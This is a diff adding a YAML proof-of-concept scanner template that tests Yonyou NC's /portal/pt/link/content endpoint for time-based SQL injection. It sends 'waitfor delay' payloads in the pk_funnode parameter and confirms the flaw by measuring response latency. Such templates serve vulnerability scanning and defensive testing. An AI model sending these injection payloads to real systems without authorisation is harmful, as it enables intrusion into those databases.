@@ -1,0 +1,29 @@
+name: poc-yaml-yongyouNC-link_content-sql
+transport: http
+
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /portal/pt/link/content?pageId=login&pk_funnode=1'waitfor+delay+'0:0:2'--
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
+    expression: response.latency >= 4000 && response.latency <= 5000
+  r1:
+    request:
+      method: GET
+      path: /portal/pt/link/content?pageId=login&pk_funnode=1'waitfor+delay+'0:0:4'--
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
+    expression: response.latency >= 8000 && response.latency <= 9000
+expression: r0() && r1()
+ 
+detail:
+  author: Superhero
+  links:
+    - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247486602&idx=1&sn=9705aff156a7ae4839d6f8642825247c&chksm=c267b9b9f51030af39831f702bdd19e4070a75da92e0f9e6dcfa00ebae7542ffa02f4c015cb8&token=1628549949&lang=zh_CN#rd
+
+
+
+
